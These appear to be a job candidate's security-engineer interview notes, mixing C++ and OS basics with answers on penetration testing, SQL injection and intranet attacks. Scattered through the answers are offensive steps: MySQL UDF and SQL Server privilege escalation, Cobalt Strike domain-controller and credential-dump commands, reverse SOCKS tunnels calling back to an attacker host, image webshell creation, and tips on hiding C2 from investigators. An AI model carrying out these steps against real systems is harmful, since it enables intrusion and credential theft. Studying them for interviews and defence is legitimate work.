(2）malloc是函数，开辟内存需要传入字节数，如malloc(100)；表示在堆上开辟了100个字节的内存，返回void*，表示分配的堆内存的起始地址，因此malloc的返回值需要强转成指定类型的地址；new是运算符，开辟内存需要指定类型，返回指定类型的地址，因此不需要进行强转。
另外强制类型转换上也不一样，C的强制类型转换使用()小括号里面加类型进行类型强转的，而C++有四种自己的类型强转方式，分别是const_cast，static_cast，reinterpret_cast和dynamic_cast（一样，等面试官来深入问你，前提是这块你准备好了，如果没有理解他们的使用场景和区别，那么这一点你还是不要说了！）

C和C++的输入输出方式也不一样，printf/scanf，和C++的cout/cin的对别，前面一组是C的库函数，后面是ostream和istream类型的对象。

C++还支持带有默认值的函数，函数的重载，inline内联函数，这些C语言都不支持，当然还有const这个关键字，C和C++也是有区别的，但是这都是目前最常用的C89标准的C内容，在C99标准里面，C语言借鉴了C++的const和inline关键字，这两方面就和C++一样了。

由于C++多了一个类，因此和C语言的作用域比起来，就多了一个类作用域，此外，C++还支持namespace名字空间，可以让用户自己定义新的名字空间作用域出来，避免全局的名字冲突问题。

C++不仅支持指针，还支持更安全的引用，不过在汇编代码上，指针和引用的操作是一样的

由于C++是面向对象的语言，支持类对象，类和类之间的代理，组合，继承，多态等等面向对象的设计，有很多的设计模式可以直接使用，因此在设计大型软件的时候，通常都会采用面向对象语言，而不会采用面向过程语言，可以更好的进行模块化设计，做到软件设计的准则：高内聚，低耦合！

在C++中，struct关键字不仅可以用来定义结构体，它也可以用来定义类（至于C++中struct和class的区别，请大家自行翻阅资料）

new开辟内存失败是抛出bad_alloc类型的异常，因此代码上要捕获该类型的异常才能正确的判断堆内存是否分配成功；malloc内存开辟失败返回的是nullptr指针。

14、C++与python区别
1.我们可以将C++和python都归类为强类型语言。python变量无需声明并不意味着就是弱类型，弱类型是指能够进行隐式转换，python是不能这么转换的，每个实例类型是固定的，转换实例类实际上是重新创建一个内存空间。

2.C++为编译型语言；python为解释型的脚本语言。

3.C++效率高，编程难；python效率低，编程简单。同样的功能，或许python可以很快的写出代码，但运行所需的时间需要成倍于C++。

15、堆栈区别
管理方式：对于栈来讲，是由编译器自动管理，无需我们手工控制；对于堆来说，释放工作由程序员控制，容易产生memory leak。
   
空间大小：一般来讲在32位系统下，堆内存可以达到4G的空间，从这个角度来看堆内存几乎是没有什么限制的。但是对于栈来讲，一般都是有一定的空间大小的，例如，在VC6下面，默认的栈空间大小是1M（好像是，记不清楚了）。

碎片问题：对于堆来讲，频繁的new/delete势必会造成内存空间的不连续，从而造成大量的碎片，使程序效率降低。对于栈来讲，则不会存在这个问题，因 为栈是先进后出的队列，他们是如此的一一对应，以至于永远都不可能有一个内存块从栈中间弹出

生长方向：对于堆来讲，生长方向是向上的，也就是向着内存地址增加的方向；对于栈来讲，它的生长方向是向下的，是向着内存地址减小的方向增长。

分配方式：堆都是动态分配的，没有静态分配的堆。栈有2种分配方式：静态分配和动态分配。静态分配是编译器完成的，比如局部变量的分配。动态分配由alloca函数进行分配，但是栈的动态分配和堆是不同的，他的动态分配是由编译器进行释放，无需我们手工实现。

分配效率：栈是机器系统提供的数据结构，计算机会在底层对栈提供支持：分配专门的寄存器存放栈的地址，压栈出栈都有专门的指令执行，这就决定了栈的效率比较 高。堆则是C/C++函数库提供的，它的机制是很复杂的，例如为了分配一块内存，库函数会按照一定的算法（具体的算法可以参考数据结构/操作系统）在堆内 存中搜索可用的足够大小的空间，如果没有足够大小的空间（可能是由于内存碎片太多），就有可能调用系统功能去增加程序数据段的内存空间，这样就有机会分到 足够大小的内存，然后进行返回。显然，堆的效率比栈要低得多。
堆栈空间分配

栈（操作系统）：由操作系统自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。

堆（操作系统）： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收，分配方式倒是类似于链表

堆栈缓存方式

栈使用的是一级缓存， 他们通常都是被调用时处于存储空间中，调用完毕立即释放。

堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定（并不是一旦成为孤儿对象就能被回收）。所以调用这些对象的速度要相对来得低一些。

堆栈数据结构区别

堆（数据结构）：堆可以被看成是一棵树，如：堆排序。

栈（数据结构）：一种先进后出的数据结构。

16、字符串转换为数字编程
8.23 网商银行
应用安全，红蓝演练，入侵检测。

主要简历评估，了解我想做啥。

我主要针对渗透测试做了详细的介绍。

8.18网易互娱 二面 8.23HR面
1、waf和IPS IDS运作和分类
网络***作为访问控制设备，主要工作在OSI模型三、四层，基于IP报文进行检测。只是对端口做 限制，对TCP协议做封堵。其产品设计无需理解HTTP会话。

IDS入侵检测（旁路部署）：IDS在交换式网络中的位置一般选择为：尽可能靠近攻击源、尽可能靠近受保护资源。与***不同的是，IDS入侵检测系统是一个旁路监听设备，没有也不需要跨接在任何链路上，无须网络流量流经它便可以工作。因此，对IDS的部署的唯一要求是：IDS应当挂接在所有所关注的流量都必须流经的链路上。在这里，“所关注流量”指的是来自高危网络区域的访问流量和需要进行统计、监视的网络报文。

这些位置通常是： 1、服务器区域的交换机上； 2、Internet接入路由器之后的第一台交换机上； 3、重点保护网段的局域网交换机上

IPS入侵防御（串行部署）：IPS系统是电脑网络安全设施，是对防病毒软件和***的补充。 IPS系统是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。

IPS与IDS的区别
A、IPS对于初始者来说，是位于***和网络的设备之间的设备。这样，如果检测到攻击，IPS会在这种攻击扩散到网络的其它地方之前阻止这个恶意的通信。而IDS只是存在于你的网络之外起到报警的作用，而不是在你的网络前面起到防御的作用。

B、IPS具有检测已知和未知攻击并具有成功防止攻击的能力而IDS没有

C、IDS的局限性是不能反击网络攻击，因为IDS传感器基于数据包嗅探技术，只能眼睁睁地看着网络信息流过。IPS可执行IDS相同的分析，因为他们可以插入网内，装在网络组件之间，而且他们可以阻止恶意活动

2、内网防御
3、连接半连接
4、劣势 举例
5、都发了offer如何选择？
8.17 奇安信 观星实验室
1、做过的大型攻防
2、Apache+php+mysql 开启了GPC还可以写shell吗？
magic_quotes_gpc转义加了引号。

开启magic_quotes_gpc=on之后，能实现addslshes()和stripslashes()这两个函数的功能。

magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据，增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。

开启magic_quote_gpc并不是绝对安全的,对于数字型注入攻击,仅仅使用addslashes()函数进行转换是不够的,还需使用intval()强制将参数转换成数字

3、sql注入如何拿到表数据
联合查询注入。

4、order by拿列数的原理
由此可知，users表中只有两个字段，数据为两列。

order by 1

order by 2

order by 后面可以接列值，也可以接数字。

5、udf提权，mysql版本，高版本怎么做
上传的路径？

unctions简称UDF，通俗来讲就是用户可自定义函数。udf提权就是利用到创建自定义函数（sys_eval），在mysql中调用这个自定义的函数（sys_eval）来实现获取对方主机的system的shell权限，从而达到提权的目的。 简单来说便是利用提权脚本放到对方mysql指定的目录下，运用脚本创建自定义函数，使用函数即可获取shell权限。 我们需要将duf.dll文件放入C:\phpStudy\MySQL\lib\plugin，前面路劲可能跟我不一样，但是需要做的就是将dll文件放入\lib\plugin目录中

Mysql版本大于5.1版本：udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。 Mysql版本小于5.1版本： udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。如果目录不存在则利用NTFS数据流创建文件目录 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。 拥有可以将udf.dll写入相应目录的权限。
1）获取到对方mysql的shell，或者是获取到mysql账号密码，能够调用mysql语句

2）对方mysql具有insert和delete权限，也就是可写可删除添加能够创建目录，写入文件验证是否可写：

show global variables like 'secure%';
3）熟悉对方mysql目录结构，以及主机型号，以便使用不同的脚本。查看主机架构，以便确认操作系统位数，使用不同的udf.dll脚本

show variables like '%compile%'; 
4）确定mysql目录结构，搜索我们需要的目录位置，查看plugin目录位置

show variables like 'plugin%'; #查找具体目录 select @@basedir;#查看mysql目录
通过Mysql向服务器写shell

1.利用联合注入写入shell into outfile

2.当sql注入为盲注或者报错注入时，可以使用分隔符写入shell

3.当secure_file_priv为NULL写入shell

Mysql提权

1.UDF手动提权

2.mysql启动项提权

3.反弹端口提权

4.CVE-2016-6663提权

6、SQL Server提权方式
public权限下，有哪些提权方法？

sa权限下 1、存在xp_cmdshell时 使用xp_cmdshel执行命令添加用户，当出现错误可以恢复和开启xp_cmdshell 2、xp_cmdshell无法使用时 使用sp_OACreate执行命令，同样当出现错误可以恢复和开启 3、当执行命令无法使用时可以用沙盒提权 使用xp_regwrite和 openrowset 4、当只有xp_regwrite可用时可以劫持粘贴键（sethc.exe） 使用xp_regwrite修改注册表

dbowner权限下 1、通过备份文件到启动项提权

Oracle命令执行的方式？
DBMS_EXPORT_EXTENSION()
影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)
权限：None
详情：这个软件包有许多易受PL/SQL注入攻击的函数。这些函数由SYS拥有，作为SYS执行并且可由PUBLIC执行。因此，如果SQL注入处于上述任何未修补的Oracle数据库版本中，那么攻击者可以调用该函数并直接执行SYS查询。
提权：该请求将导致查询"GRANT DBA TO PUBLIC"以SYS身份执行。 因为这个函数允许PL / SQL缺陷（PL / SQL注入）。一旦这个请求成功执行，PUBLIC获取DBA角色，从而提升当前user的特权

7、XSS攻击防御
8、CSRF与XSS的区别
CSRF与XSS的区别： XSS的核心是操作目标网站的HTML代码，窃取Cookie。不需要登录。 CSRF的核心是在非目标网站的HTML代码上做手脚，让受害者浏览器偷偷的去访问目标网站。需要登录。

因为有同源法则的存在，CSRF不可以直接窃取本地的Cookie，XSS可以直接窃取，CSRF只能够利用Cookie。

9、文件上传
10、.php黑名单绕过
11、shiro框架 利用
除了AES加密，还有哪种？MD5？

shiro在1.4.2版本之前， AES的模式为CBC， IV是随机生成的，并且IV并没有真正使用起来，所以整个AES加解密过程的key就很重要了，正是因为AES使用Key泄漏导致反序列化的cookie可控，从而引发反序列化漏洞。在1.4.2版本后，shiro已经更换加密模式 AES-CBC为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。

大于1.2.4版本如何利用
12、spring了解吗
13、代码审计做过吗，java代码如何审计，php如何审计
Fortify是一个自动化的代码审计工具

14、include和require的区别
require()如果在包含过程中出错，就会直接退出，致命错误，不执行后续语句

include()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行

对 include() 语句来说，在执行文件时每次都要进行读取和评估；而对于 require() 来说，文件只处理一次（实际上，文件内容替换 require() 语句）。如果可能执行多次的代码，则使用 require() 效率比较高。另外一方面，如果每次执行代码时是读取不同的文件，或者有通过一组文件迭代的循环，就使用 include() 语句。

15、Filter内存实现和检测
16、如何找DC
ntds.dit是AD中的数据库文件，它被保存在域控制器c:\windows\system32\ntds\NTDS.DIT位置。活动目录的数据库文件（ntds.dit）包含有关活动目录域中所有对象的所有信息，其中包含所有域用户和计算机帐户的密码哈希值。该文件在所有域控制器之间自动同步，它只能被域管理员访问和修改。

进入shell，查看系统信息。具有内网环境，DNS服务器可能就是域控。

查询域控制器

beacon> shell net group "domain controllers" /domain
17、如何找域内所有hash
 logonpasswords
18、如何判读出网
使用ping

telnet

curl等。

19、如果不出网，如何打内网
ping通过初步判断当前机器 icmp 不出网：基于 HTTP 隧道打！基于 HTTP 隧道上线到 CobaltStrike.通过webshell实现内网SOCK4代理，端口映射可以使目标不出网情况下在cs上线。建立基于http的socks隧道.

20、端口识别：88，873，389，1099，5432，7001，3306，1433，1521，6379
20：FTP服务的数据传输端口
21：FTP服务的连接端口，可能存在  弱口令暴力破解
22：SSH服务端口，可能存在 弱口令暴力破解
23：Telnet端口，可能存在 弱口令暴力破解
25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应
43：whois服务端口
53：DNS服务端口(TCP/UDP 53)
67/68：DHCP服务端口
69：TFTP端口，可能存在弱口令
80：HTTP端口，常见web漏洞
88：Kerberos协议端口
110：POP3邮件服务端口，和SMTP的25端口对应
135：RPC服务
137/138： NMB服务
139：SMB/CIFS服务
143：IMAP协议端口
161/162: Snmp服务，public弱口令
389：LDAP目录访问协议，有可能存在注入、弱口令，域控才会开放此端口
443：HTTPS端口，心脏滴血等与SSL有关的漏洞
445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010
512/513/514：Linux Rexec服务端口，可能存在爆破
636：LDAPS目录访问协议，域控才会开放此端口
873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞
1080：socket端口，可能存在爆破
1099：RMI，可能存在 RMI反序列化漏洞
1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露
1414：IBM WebSphere MQ服务端口
1433：SQL Server对外提供服务端口
1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口
1521：oracle数据库端口
2049：NFS服务端口，可能存在NFS配置不当
2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞
2375：Docker端口，可能存在 Docker未授权访问漏洞
2601:   Zebra ，默认密码zebr
3128:   squid ，匿名访问（可能内网漫游)
3268：LDAP目录访问协议，有可能存在注入、弱口令
3306：MySQL数据库端口，可能存在 弱口令暴力破解
3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现
3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞
4440：Rundeck，弱口令admin
4560：log4j SocketServer监听的端口，可能存在 log4j<=1.2.17反序列化漏洞（CVE-2019-17571）
4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)
4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin
5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞
5432：PostGreSQL数据库的端口
5632：PyAnywhere服务端口，可能存在代码执行漏洞
5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞
5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞
6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞
7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞
7180：Cloudera manager端口
8000：JDWP，可能存在JDWP远程代码执行漏洞。
8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞
8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell
8080-8090：可能存在web服务
8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞
8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）
9000：fastcgi端口，可能存在远程命令执行漏洞
9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)
9043/9090：WebSphere，可能存在WebSphere反序列化漏洞
9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞
10000：Webmin-Web控制面板，可能存在弱口令
10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)
11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞
27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞
50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。
50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞
61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现
60020：hbase.regionserver.port，HRegionServer的RPC端口
60030：hbase.regionserver.info.port，HRegionServer的http端口
21、内网如何搭隧道
打域控，挂socker正向代理(cs的socks4很不好用，后来使用的是frp)。

正向代理？反向代理？

内网穿透？frp，Ngrok，Serveo

icmptunnel等

frp
frp 是一种快速反向代理，可以将 NAT 或***后面的本地服务器暴露给 Internet。 截至目前，它支持 TCP 和 UDP，以及 HTTP 和 HTTPS 协议，其中请求可以通过域名转发到内部服务。

frp 是一个开源项目， 采用 C/S 模式，将服务端部署在具有公网 IP 的机器上，客户端部署在内网或***内的机器上，通过访问暴露在服务器上的端口，反向代理到处于内网的服务。 在此基础上，frp 支持 TCP, UDP, HTTP, HTTPS 等多种协议，提供了加密、压缩，身份认证，代理限速，负载均衡等众多能力。

搭建frp服务器进行内网穿透，可以达到不错的速度，且理论上可以开放任何想要的端口，可以实现的功能远不止远程桌面或者文件共享。

frpc 客户端，工作在内网服务器上
frps 服务器端，工作在公网服务器上
socks5
在kali上添加一个转接隧道，把1080端口收到的代理请求转交给1234端口；在web服务器上启动SOCKS5服务，并反弹到IP地址为192.168.1.109（kali）的1234端口上。之后我们在kali通过web服务器做跳板来访问内网主机A。

1）SOCKS

Socks是一种代理服务，可以简单地将一端的系统连接到另外一端，支持多种协议，包括http、ftp请求及其它类型的请求。它分socks 4 和socks 5两种类型，socks 4只支持TCP协议而socks 5支持TCP/UDP协议，还支持各种身份验证机制等协议，其标准端口为1080。

2）Earthworm

EW是一套便携式的网络穿透工具，具有SOCKS5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，而且适用于不同的操作系统。

3）ProxyChains

ProxyChains是Linux下的代理工具，kali已经安装，它可以使任何程序通过代理上网，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4和SOCKS5类型的代理服务器，并且可配置多个代理。

在kali上运行：

./ew_linux_x64 -s rcsocks -l 1080 -e 1234
该命令的意思是在kali上添加一个转接隧道，把本地1080端口收到的代理请求转交给1234端口。

远程连接web服务器，运行：

./ew_linux_x64 -s rssocks -d 192.168.1.109 -e 1234
该命令的意思是在web服务器上启动SOCKS5服务，并反弹到IP地址为192.168.1.109（kali）的1234端口上。

配置proxychains.conf，现在就可以通过访问127.0.0.1:1080端口使用在右侧web服务器上架设的SOCKS5代理服务了。

用proxychains可以启动任何程序，proxychains配合nmap和msf是内网渗透的大杀器。

1.1 正向代理(Forward Proxy)
Lhost－－》proxy－－》Rhost

Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。

1.2 反向代理（reverse proxy）
Lhost<--->proxy<--->firewall<--->Rhost

和正向代理相反（废话），Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些***只允许proxy数据进出的时候可以有效的进行穿透

正向代理是我们自己(Lhost)主动(proxy)进攻，反向代理是她(Rhost)主动通过 (proxy)找我(Lhost)。

8.16 顺丰科技 安全工程师 8.20二面 hr面
红蓝对，建设安全，web运营，应用测试，终端防御，应急响应。

1、渗透流程
以渗透工具提问。

2、文件上传
3、ctf？SRC？
4、内网渗透最深刻的
5、项目讲一讲深刻的
6、会使用的语言
7、溯源，如何反溯源隐藏自己
攻击方使用匿名资源变得非常必要：

***、匿名代理 纯净的渗透环境、虚拟机 匿名邮箱、手机号、VPS等 纯净的移动设备、无线设备等
在识别蜜罐之后，可以通过投喂大量脏数据，甚至伪造一个反向蜜罐，诱导防守方进入并误导溯源或者消耗防守方的精力

通过域名 + CDN 完美隐藏你的 C2

隐藏好自己的ip，保证自己不被溯源:ip代理(socks和https，http代理)

Windows排查后门

对于已经留有后门的机器，可以对进程进行排查 使用pc hunter对文件签名进行校验，发现存在未签名文件（红色），重点对该文件进行分析

1.驱动检测到的可疑对象，隐藏服务，进程，被挂钩函数的文件或进程>红色。 2.文件厂商是微软的>黑色。 3.文件厂商非微软的>蓝色。 4.校验所有数字签名后，对没有签名的模块或签名已过期或吊销的>玫红色。 5.查看下挂模块时，微软进程被下挂其他公司模块的>黄棕色。

Linux应急思路篇

对于攻击者来说，不管他如何隐藏，总要走流量。我们主要针对流量进行分析即可。

netstat -anlpt 查看是否存在恶意流量（通过威胁情报进行判定是否为恶意域名）

8、内存马原理，Filter作用与 检测？
9、CSRF与XSS区别
CSRF浏览器信任，XSS用户信任。

10、文件上传
11、竞争条件
我们成功上传了php文件但后端在短时间内将其删除了，所以我们要抢到在它删除之前访问文件，就如我们打开文件的时候去删除它，会提示文件文件已打开一样，这样从而防止文件被删除。

保存下来删除，不断上传，不断访问。

12、OSI7层，传输层哪些协议
13、TCP三次握手
14、搭建隧道 icmp协议
在后渗透中内网隧道是必不可少的，在能够TCP出网的情况下搭建隧道是最容易的，使用frp即稳定又方便。当我们拿到web服务器的shell之后发现只能使用icmp协议访问公网（Kali）vp/s（ping），所以只能用ICMP搭建通往内网的隧道，访问内网服务器进行后续攻击操作。

icmptunnel工具，pingtunnel工具，DNS。

在一些网络环境中，如果攻击者使用各类上层隧道(例如：HTTP隧道、DNS隧道、常规正/反向端口转发等)进行的操作都失败了，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，

从而穿过***(***一般不会屏蔽ping的数据包)，实现不受限制的访问访问。pingtunnel工具是基于网络层面ICMP协议的内网穿透工具.

8.16东方财富 8.17二面HR
合规，开发，建设，安全测试，风控，评估。

1、内网渗透做些什么？
2、CSRF和SSRF
3、研究生毕业规划
4、研究生课题
5、安全事件
一些勒索软件运营团伙从勒索软件即服务（RaaS）转向私有化服务.

2021年6月8日，美国选民沟通平台iConstituent遭到勒索软件攻击，导致部分议员无法使用该平台检索选民信息，这是距离政客最近的一次勒索软件威胁。

2021年6月11日，美国核武器承包商Sol Oriens遭遇REvil勒索软件攻击，导致数据被盗。

2021年6月14日，Avaddon勒索软件宣布停止运营，并发放2934个解密密钥。

新的 PetitPotam NTLM 中继攻击让黑客接管 Windows 域
日期: 2021年07月26日 等级: 高 作者: Ravie Lakshmanan 标签: PetitPotam, NTLM, Windows, Domains, security flaw 行业: 制造业 涉及组织: microsoft
Windows操作系统中的新发现的安全漏洞可以被利用以强制远程Windows服务器，包括域控制器，以使用恶意目的地进行身份验证，从而允许对持续阶段进行对手并完全接管Windows域。

该问题被称为“Petitpotam”，由安全研究员GillesLionel分享了技术细节和概念证明（PoC）代码，指出该漏洞的工作原理是“Windows主机通过MS-EFSRPCEfsRpcOpenFileRaw函数对其他机器进行身份验证”。

MS-EFSRPC是微软的加密文件系统远程协议，该协议用于对远程存储并通过网络访问的加密数据执行维护和管理操作。

具体来说，该攻击使域控制器能够使用MS-EFSRPC接口在恶意行为者的控制下对远程 NTLM进行身份验证并共享其身份验证信息。通过连接到LSARPC完成以上控制，从而导致目标服务器连接到任意服务器并执行NTLM身份验证。

网络安全人员称：攻击者可以通过使用MS-EFSRPC协议将DC NTLM 凭据中继到Active Directory证书服务AD CS Web注册页面以注册DC证书，从而以域控制器为目标来发送其凭据。 这将有效地为攻击者提供一个身份验证证书，该证书可用于作为DC访问域服务并破坏整个域。

防御
微软指出：为了防止在启用了NTLM的网络上发生NTLM中继攻击，域管理员必须确保允许NTLM身份验证的服务使用诸如扩展身份验证保护 (EPA) 或签名功能(如 SMB 签名)之类的保护措施。”

为了防止这种攻击，Windows制造商建议客户在域控制器上禁用 NTLM身份验证。如果出于兼容性原因无法关闭 NTLM，该公司敦促用户采取以下两个步骤之一 ：

使用组策略网络安全：限制 NTLM：传入 NTLM 流量在域中的任何 AD CS 服务器上禁用 NTLM。

在运行“证书颁发机构Web注册”或“证书注册Web服务”服务的域中的AD CS服务器上禁用Internet信息服务(IIS)的NTLM。

6、勒索软件
勒索软件，又称勒索病毒，是一种特殊的恶意软件，又被人归类为“阻断访问式攻击”（denial-of-access attack） 。勒索软件与其他病毒最大的不同在于攻击手法和中毒方式，部分勒索软件仅是单纯地将受害者的电脑锁起来，而也有部分勒索软件会系统性地加密受害者硬盘上的文件。所有的勒索软件都会要求受害者缴纳赎金以取回对电脑的控制权，或是取回受害者根本无从自行获取的解密密钥以解密文件。

不仅加密用户文件，同时还窃取了用户信息，如果不缴纳赎金，则公开用户文件。

勒索软件的传播其主要方式为垃圾邮件、漏洞利用、RDP弱口令。大多数攻击者一般采用的成熟的漏洞利用工具进行攻击，如永恒之蓝、 RIG 、 GrandSoft 等漏洞攻击包等。如果用户没有及时修复相关漏洞，很可能遭受攻击。

防御：

使用大小写字母、数字、特殊符号混合长度15+的强密码作为登录密码，并定期进行修改；

及时更新系统补丁，及时更新应用软件到最新版本；

对重要文件及时备份；

适当安装反病毒软件，及时更新病毒库；

不随便运行邮件附件、未知可执行程序，对于不确定文件，可放入沙箱如s.threatbook.cn或 any.run等；

不访问不安全连接；

无特别需求，应尽量关闭3389、445等端口。

7、勒索软件和加密有关吗？
公私钥。

8、具体的漏洞，挖到的漏洞
9、学安全的较少，如何看
8.13 猿辅导应用安全工程师 8.26二面 9.2终面
风险评估，需求设计，发现漏洞与风险，提出修复方式。

1、渗透测试流程
2、SQL注入分类
3、宽字节注入与防御
宽字节注入：编码方式不统一。GBK和utf-8。加一个反斜杠转义，mysql 会将 \ 编码为 %5c ，宽字节中两个字节代表一个汉字。magic_quotes_gpc选项。

为了避免漏洞，网站一般会设置UTF-8编码，然后进行转义过滤。但是由于一些不经意的字符集转换，又会导致漏洞。 使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数先转为UTF-8，然后再拼接入SQL语句。

对于宽字节编码，有一种最好的修补就是：

（1）使用mysql_set_charset(GBK)指定字符集

（2）使用mysql_real_escape_string进行转义

原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题

4、SSRF与防御
白名单，限制请求方法，定制出错信息，

5、白名单绕过
.采用%00截断绕过:实验成功需要对方php版本小于5.3.4，并且magic_quotes_gpc函数为off

使用命令copy 1.jpg /b + shell.php /a webshell.jpg，将php一句话追加到jpg图片末尾，应为我们上传的图片马无法被解析成php形式，通常图片马配合%00或者0x00截断上传，或者配合解析漏洞

条件竞争：在服务器还没有删除tj.php的时候，去访问他，可以执行出来一个新的木马qing.php

双文件上传

6、git的优势，和SVN？的区别
Git 是一款免费的、开源的、分布式的版本控制系统。旨在快速高效地处理无论规模大小的任何软件工程。

每一个 Git克隆 都是一个完整的文件库，含有全部历史记录和修订追踪能力，不依赖于网络连接或中心服务器。其最大特色就是“分支”及“合并”操作非常快速、简便。

目前大多数VCS都是集中式式，如SVN，也就是说一台SVN服务器，别人都是客户端，数据的操作都必需在这台服务器上。这会造成一个明显的问题：单点故障

Git与SVN的主要区别

Git是分布式SCM，而SVN是基于服务器的，也就是说每个开发者本地都有一套git库，每个人维护自己的版本（或者合并其他人的版本），而SVN是每个人写完代码后都及时的checkin到服务器上，进行合并。
Git的优势

说到优势，那么自然是相对与SVN而言的

版本库本地化，支持离线提交，相对独立不影响协同开发。每个开发者都拥有自己的版本控制库，在自己的版本库上可以任意的执行提交代码、创建分支等行为。例如，开发者认为自己提交的代码有问题？没关系，因为版本库是自己的，回滚历史、反复提交、归并分支并不会影响到其他开发者。
更少的“仓库污染”。git对于每个工程只会产生一个.git目录，这个工程所有的版本控制信息都在这个目录中，不会像SVN那样在每个目录下都产生.svn目录。
把内容按元数据方式存储，完整克隆版本库。所有版本信息位于.git目录中，它是处于你的机器上的一个克隆版的版本库，它拥有中心版本库上所有的东西，例如标签、分支、版本记录等。
支持快速切换分支方便合并，比较合并性能好。服务端也可以切分支，本地也可以切分支。在同一目录下即可切换不同的分支，方便合并，且合并文件速度比SVN快。
分布式版本库，无单点故障，内容完整性好。内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。
7、域渗透的例子
8、未授权访问的案例与防御
redis服务

防御

9、赋予权限的chmod
10、进程间通信方式
管道 匿名和有名；消息队列，套接字通信

进程间通信的方式——信号、管道、消息队列、共享内存

\1. 管道pipe：管道是一种半双工的通信方式，数据只能单向流动，而且只能在具有亲缘关系的进程间使用。进程的亲缘关系通常是指父子进程关系。 \2. 命名管道FIFO：有名管道也是半双工的通信方式，但是它允许无亲缘关系进程间的通信。 \4. 消息队列MessageQueue：消息队列是由消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点。 \5. 共享存储SharedMemory：共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的 IPC 方式，它是针对其他进程间通信方式运行效率低而专门设计的。它往往与其他通信机制，如信号两，配合使用，来实现进程间的同步和通信。 \6. 信号量Semaphore：信号量是一个计数器，可以用来控制多个进程对共享资源的访问。它常作为一种锁机制，防止某进程正在访问共享资源时，其他进程也访问该资源。因此，主要作为进程间以及同一进程内不同线程之间的同步手段。 \7. 套接字Socket：套解口也是一种进程间通信机制，与其他通信机制不同的是，它可用于不同及其间的进程通信。 \8. 信号 ( sinal ) ： 信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生。
三面编程：

去掉重复字符不可以拷贝

string removeDuplicate2(string s) {  int len = s.length();  if(len < 2)   return s;  string str = "";  for(int i=0; i<len; ++i)  {  if(s[i] != ' ')  {  str += s[i];  for(int j=i+1; j<len; ++j)  {  if(s[j]==s[i])  {  s[j] = ' ';  }   }  }  }  return str; }
11、linux常用命令
查看磁盘空间

linux查看磁盘空间的方法：1、使用df命令，可以查看文件系统，并获取硬盘被占用了多少空间，目前还剩下多少空间等信息。2、使用du命令，可以显示磁盘空间的使用情况。

查看状态

查看所有服务的运行状态：. service –status -all

